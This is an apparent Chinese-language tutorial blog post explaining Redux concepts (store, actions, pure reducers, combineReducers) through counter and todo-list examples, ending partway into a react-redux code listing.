<p>Redux并不是非用不可，有些项目你用React其实也够了，有些项目可能你也会选用其它状态管理框架如Mobx。不过React+Redux仍是目前最热门、最经典的组合，它足以支撑任何大型中后台应用的开发。</p>
<h2 id="Redux的数据流"><a href="#Redux的数据流" class="headerlink" title="Redux的数据流"></a>Redux的数据流</h2><p>我们先来总体介绍一下Redux的数据流，这里你不要完全理解，因为数据流中涉及的各个概念后面我们都会详细介绍。</p>
<p><img src="https://wx-store.oss-cn-beijing.aliyuncs.com/8ba7e82e081.jpeg" alt="Redux的数据流"></p>
<p>从图中我们可以看到，Redux的数据流是单向的，你只能通过改变数据的方式来改变视图，这样也让数据流变得清晰、可预测。</p>
<p>Redux的一般流程是：视图触发事件，Action构成函数生成一个action，action其实就是普通对象，它有一个表示此action类型的必填属性type，容器Store会将action作为参数，调用dispatch方法分发，然后就会走相应的reducer函数，reducer函数定义了action是如何改变Store的状态（state）的。最后Store的状态改变，视图自动刷新。</p>
<h2 id="Store"><a href="#Store" class="headerlink" title="Store"></a>Store</h2><p>Store是保存应用状态（state）的地方，你可以把它看成一个容器，改变Store中state的唯一途径就是dispatch(action)。应用中应有且仅有一个Store。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Store = createStore(reducer)<span class="comment">// 创建Store</span></span><br></pre></td></tr></table></figure>
<p>Store上有几个方法</p>
<p>1.getState()：获得state</p>
<p>2.dispatch(action): 分发一个action</p>
<p>3.subscribe(listener): 添加监听函数，每次分发action都会把监听函数执行一遍</p>
<h2 id="action"><a href="#action" class="headerlink" title="action"></a>action</h2><p>dispatch(action)是唯一可以改变state的方式，action其实就是JavaScript普通对象，action必须有一个字符串类型的type字段来表示执行动作的类型。</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> action = &#123;</span><br><span class="line">  type: <span class="string">"ADD"</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="reducer"><a href="#reducer" class="headerlink" title="reducer"></a>reducer</h2><p>reducer用于描述Store是如何根据action来改变state的。它本质是一个纯函数。</p>
<p>那么什么是纯函数呢？</p>
<p>1.不对外界产生影响</p>
<p>2.不对输入产生影响</p>
<p>3.同样的输入，必定得到同样的输出。</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.不对外界产生影响</p>
<p>反例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> sum = x + y;</span><br><span class="line">  updateSql(sum);<span class="comment">// 对数据库有操作</span></span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.不对输入产生影响</p>
<p>反例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addComponent</span>(<span class="params">arr, ele</span>) </span>&#123;</span><br><span class="line">  arr.push(ele);</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.同样的输入，必定得到同样的输出。</p>
<p>反例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>redux的常用知识点就是这些，是不是很简单呢？接下来我们就通过实际例子来熟练掌握它。</p>
<h2 id="实现一个计数器"><a href="#实现一个计数器" class="headerlink" title="实现一个计数器"></a>实现一个计数器</h2><p>首先我们编写一个计数器reducer</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// reducer是一个纯函数，用于描述action如何改变state</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params">state = <span class="number">0</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"INCREASE"</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"DECREASE"</span>:</span><br><span class="line">      <span class="keyword">return</span> state - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后用redux的createStore api创建一个Store</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用redux中的createStore api创建Store</span></span><br><span class="line"><span class="keyword">const</span> Store = createStore(counter);</span><br></pre></td></tr></table></figure>
<p>我们来测试一下这个Store</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Store = createStore(counter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store提供了getState获取state</span></span><br><span class="line"><span class="built_in">console</span>.log(Store.getState()); <span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过Store的dispatch方法分发一个action</span></span><br><span class="line">Store.dispatch(&#123;</span><br><span class="line">  type: <span class="string">"INCREASE"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Store.getState()); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">Store.dispatch(&#123;</span><br><span class="line">  type: <span class="string">"DECREASE"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Store.getState()); <span class="comment">//0</span></span><br></pre></td></tr></table></figure>
<p>可以发现它已经具备一个计数器的功能了，并且我们前面介绍的redux知识点也基本囊括其中了。没错，redux的使用就是这么简单！</p>
<p>当然，我们也想在页面中直观地看到效果</p>
<p>我们做一些DOM处理就可以了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文档元素绑定上点击事件，会在DOM章节中介绍</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(</span><br><span class="line">  <span class="string">"click"</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Store.dispatch(&#123;</span><br><span class="line">      type: <span class="string">"INCREASE"</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将html内容写入body元素中，会在DOM章节中介绍</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.body.innerHTML = <span class="string">"&lt;h1&gt;"</span> + Store.getState() + <span class="string">"&lt;/h1&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化页面</span></span><br><span class="line">render();</span><br><span class="line"></span><br><span class="line"><span class="comment">// subscribe用于添加监听函数，每次分发action都会把监听函数执行一遍</span></span><br><span class="line">Store.subscribe(render);</span><br></pre></td></tr></table></figure>
<p>这样你点击页面数字就会累加了。</p>
<h2 id="简单结合react的计数器"><a href="#简单结合react的计数器" class="headerlink" title="简单结合react的计数器"></a>简单结合react的计数器</h2><p>下面是react和redux的简单结合，涉及的知识点我们前面都介绍过。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params">state = <span class="number">0</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"INCREASE"</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"DECREASE"</span>:</span><br><span class="line">      <span class="keyword">return</span> state - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Store = createStore(counter);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;&#123;Store.getState()&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button</span></span><br><span class="line"><span class="regexp">          onClick=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">            Store.dispatch(&#123;</span></span><br><span class="line"><span class="regexp">              type: "INCREASE"</span></span><br><span class="line"><span class="regexp">            &#125;);</span></span><br><span class="line"><span class="regexp">          &#125;&#125;</span></span><br><span class="line"><span class="regexp">        &gt;</span></span><br><span class="line"><span class="regexp">          +</span></span><br><span class="line"><span class="regexp">        &lt;/</span>button&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          onClick=&#123;() =&gt; &#123;</span><br><span class="line">            Store.dispatch(&#123;</span><br><span class="line">              type: <span class="string">"DECREASE"</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;&#125;</span><br><span class="line">        &gt;</span><br><span class="line">          -</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br><span class="line">Store.subscribe(render);</span><br></pre></td></tr></table></figure>
<h2 id="combineReducers"><a href="#combineReducers" class="headerlink" title="combineReducers"></a>combineReducers</h2><p>reducer是描述action如何改变state的函数，我们发现如果按照前面的写法，reducer逻辑只能写在一个函数里，无法拆分。</p>
<p>这时候我们就需要用到combineReducers api了，它可以将多个reducer组合起来。这样你就可以编写多个reducer函数，将不同功能写在不同的reducer里了。</p>
<h2 id="示例：todolist"><a href="#示例：todolist" class="headerlink" title="示例：todolist"></a>示例：todolist</h2><p>我们看一个todoList的例子，看看combineReducers是怎么使用的。</p>
<p>这个例子里有两个reducer，todos和visiableFilter。todos是存储清单列表数据的，visiableFilter是存储过滤条件的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./reducers/todos.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> gid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> todos = <span class="function">(<span class="params">state = [], action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"ADD_TODO"</span>:</span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        ...state,</span><br><span class="line">        &#123;</span><br><span class="line">          id: ++gid,</span><br><span class="line">          text: action.text,</span><br><span class="line">          completed: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">      ];</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"TOGGLE_TODO"</span>:</span><br><span class="line">      <span class="keyword">return</span> state.map(<span class="function"><span class="params">todo</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (todo.id === action.id) &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            ...todo,</span><br><span class="line">            completed: !todo.completed</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> todo;</span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> todos;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./reducers/visiableFilter.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visiableFilter = <span class="function">(<span class="params">state = <span class="string">"SHOW_ALL"</span>, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"SET_VISIABLE_FILTER"</span>:</span><br><span class="line">      <span class="keyword">return</span> action.filter;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> visiableFilter;</span><br></pre></td></tr></table></figure>
<p>我们使用combineReducer将两个reducer组合起来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./reducers/index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> todos <span class="keyword">from</span> <span class="string">"./todos.js"</span>;</span><br><span class="line"><span class="keyword">import</span> visiableFilter <span class="keyword">from</span> <span class="string">"./visiableFilter.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> combineReducers(&#123;</span><br><span class="line">  todos,</span><br><span class="line">  visiableFilter</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>接下来我们就可以在应用中使用这个rootReducer了。</p>
<p>由于最终要展示的列表是todos和visiableFilter计算得出的结果，所以我们编写了一个getFilterTodos做这部分计算操作。</p>
<p>我们还增加了筛选功能，就是底部的三个FilterLink，它们对应的是visiableFilter reducer的操作。</p>
<p>所以将todos和visiableFilter两个独立的状态拆分开了，一个状态专门负责一个功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./index.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rootReducer <span class="keyword">from</span> <span class="string">"./reducers/index.js"</span>;</span><br><span class="line"><span class="keyword">import</span> FilterLink <span class="keyword">from</span> <span class="string">"./FilterLink.jsx"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Store = createStore(rootReducer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FILTER_TYPE_MAP = &#123;</span><br><span class="line">  SHOW_ALL: <span class="string">"SHOW_ALL"</span>,</span><br><span class="line">  SHOW_COMPLETED: <span class="string">"SHOW_COMPLETED"</span>,</span><br><span class="line">  SHOW_ACTIVE: <span class="string">"SHOW_ACTIVE"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getFilterTodos = <span class="function">(<span class="params">todos, visiableFilter</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (visiableFilter) &#123;</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_ALL:</span><br><span class="line">      <span class="keyword">return</span> todos;</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_COMPLETED:</span><br><span class="line">      <span class="keyword">return</span> todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.completed);</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_ACTIVE:</span><br><span class="line">      <span class="keyword">return</span> todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> !todo.completed);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"unknow filter type"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.inputRef = React.createRef();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> state = Store.getState();</span><br><span class="line">    <span class="keyword">let</span> &#123; todos, visiableFilter &#125; = state;</span><br><span class="line"></span><br><span class="line">    todos = getFilterTodos(todos, visiableFilter);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> ref=&#123;<span class="keyword">this</span>.inputRef&#125; /&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          onClick=&#123;() =&gt; &#123;</span><br><span class="line">            Store.dispatch(&#123;</span><br><span class="line">              type: <span class="string">"ADD_TODO"</span>,</span><br><span class="line">              text: <span class="keyword">this</span>.inputRef.current.value</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;&#125;</span><br><span class="line">        &gt;</span><br><span class="line">          add</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">          &#123;todos.map(todo =&gt; (</span></span><br><span class="line"><span class="regexp">            &lt;li</span></span><br><span class="line"><span class="regexp">              style=&#123;&#123;</span></span><br><span class="line"><span class="regexp">                textDecoration: todo.completed ? "line-through" : "none"</span></span><br><span class="line"><span class="regexp">              &#125;&#125;</span></span><br><span class="line"><span class="regexp">              key=&#123;todo.id&#125;</span></span><br><span class="line"><span class="regexp">              onClick=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">                Store.dispatch(&#123;</span></span><br><span class="line"><span class="regexp">                  type: "TOGGLE_TODO",</span></span><br><span class="line"><span class="regexp">                  id: todo.id</span></span><br><span class="line"><span class="regexp">                &#125;);</span></span><br><span class="line"><span class="regexp">              &#125;&#125;</span></span><br><span class="line"><span class="regexp">            &gt;</span></span><br><span class="line"><span class="regexp">              &#123;todo.text&#125;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>li&gt;</span><br><span class="line">          ))&#125;</span><br><span class="line">        &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">        &#123;Object.keys(FILTER_TYPE_MAP).map(key =&gt; &#123;</span></span><br><span class="line"><span class="regexp">          const filter = FILTER_TYPE_MAP[key];</span></span><br><span class="line"><span class="regexp">          return (</span></span><br><span class="line"><span class="regexp">            &lt;FilterLink</span></span><br><span class="line"><span class="regexp">              key=&#123;filter&#125;</span></span><br><span class="line"><span class="regexp">              filter=&#123;filter&#125;</span></span><br><span class="line"><span class="regexp">              visiableFilter=&#123;visiableFilter&#125;</span></span><br><span class="line"><span class="regexp">              handleClick=&#123;() =&gt; &#123;</span></span><br><span class="line"><span class="regexp">                Store.dispatch(&#123;</span></span><br><span class="line"><span class="regexp">                  type: "SET_VISIABLE_FILTER",</span></span><br><span class="line"><span class="regexp">                  filter</span></span><br><span class="line"><span class="regexp">                &#125;);</span></span><br><span class="line"><span class="regexp">              &#125;&#125;</span></span><br><span class="line"><span class="regexp">            /</span>&gt;</span><br><span class="line">          );</span><br><span class="line">        &#125;)&#125;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const render = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">render();</span><br><span class="line">Store.subscribe(render);</span><br></pre></td></tr></table></figure>
<p>FilterLink是我们为了实现代码复用编写的一个组件，这样我们就不需要重复写三个类似的标签和行为了。当它自身的filter和当前用户选中的visiableFilter相等时，组件文本的颜色是红色的，同时点击组件可以实现过滤操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./FilterLink.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterLink</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filter, visiableFilter, handleClick &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> style = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (filter === visiableFilter) &#123;</span><br><span class="line">      style.color = <span class="string">"red"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div style=&#123;style&#125; onClick=&#123;handleClick&#125;&gt;</span><br><span class="line">        &#123;filter&#125;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default FilterLink;</span></span><br></pre></td></tr></table></figure>
<h2 id="react-redux"><a href="#react-redux" class="headerlink" title="react-redux"></a>react-redux</h2><p>在实际项目中redux和react结合有更好的方式，那就是react-redux库。</p>
<p>它主要作用是用Provider组件将根组件包裹，将Store从Provider组件注入，这样使用connect方法就可以让任意子组件访问Store中state和disptach了（也就是状态和改变状态的方法）。当state更新时，相关子组件也会自动更新(状态和视图保持一致)。</p>
<p>首先我们还是先编写redux部分</p>
<p>reducer部分和上一节是相似的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./redux/reducers/todos.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; ADD_TODO, TOGGLE_TODO &#125; <span class="keyword">from</span> <span class="string">"../actions"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> gid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> todos = <span class="function">(<span class="params">state = [], action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> ADD_TODO:</span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        ...state,</span><br><span class="line">        &#123;</span><br><span class="line">          id: ++gid,</span><br><span class="line">          text: action.text,</span><br><span class="line">          completed: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">      ];</span><br><span class="line">    <span class="keyword">case</span> TOGGLE_TODO:</span><br><span class="line">      <span class="keyword">return</span> state.map(<span class="function"><span class="params">todo</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (todo.id === action.id) &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            ...todo,</span><br><span class="line">            completed: !todo.completed</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> todo;</span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> todos;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./redux/reducers/visiableFilter.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; SET_VISIABLE_FILTER &#125; <span class="keyword">from</span> <span class="string">"../actions"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visiableFilter = <span class="function">(<span class="params">state = <span class="string">"SHOW_ALL"</span>, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> SET_VISIABLE_FILTER:</span><br><span class="line">      <span class="keyword">return</span> action.filter;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> visiableFilter;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./redux/reducers/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> todos <span class="keyword">from</span> <span class="string">"./todos.js"</span>;</span><br><span class="line"><span class="keyword">import</span> visiableFilter <span class="keyword">from</span> <span class="string">"./visiableFilter.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> combineReducers(&#123;</span><br><span class="line">  todos,</span><br><span class="line">  visiableFilter</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们应用所有的action都写actions目录，这样我们就能很方便地查找到整个应用触发了哪些行为操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./redux/actions/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> ADD_TODO = <span class="string">"ADD_TODO"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TOGGLE_TODO = <span class="string">"TOGGLE_TODO"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SET_VISIABLE_FILTER = <span class="string">"SET_VISIABLE_FILTER"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> addTodo = <span class="function"><span class="params">todo</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: ADD_TODO,</span><br><span class="line">    text: todo</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> toggleTodo = <span class="function"><span class="params">id</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: TOGGLE_TODO,</span><br><span class="line">    id</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setVisiableFilter = <span class="function"><span class="params">filter</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: SET_VISIABLE_FILTER,</span><br><span class="line">    filter</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>redux代码编写部分介绍完了，我们再看看用react-redux库如何将redux和react结合起来。</p>
<p>可以看到我们使用Provider组件将应用的根组件App包裹，再将store注入进去。</p>
<p>同时我们做了进一步的优化，整个应用被拆成了AddTodo、TodoList、FilterLink三个组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./index.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rootReducer <span class="keyword">from</span> <span class="string">"./redux/reducers/index.js"</span>;</span><br><span class="line"><span class="keyword">import</span> AddTodo <span class="keyword">from</span> <span class="string">"./components/AddTodo.jsx"</span>;</span><br><span class="line"><span class="keyword">import</span> TodoList <span class="keyword">from</span> <span class="string">"./components/TodoList.jsx"</span>;</span><br><span class="line"><span class="keyword">import</span> FilterLink <span class="keyword">from</span> <span 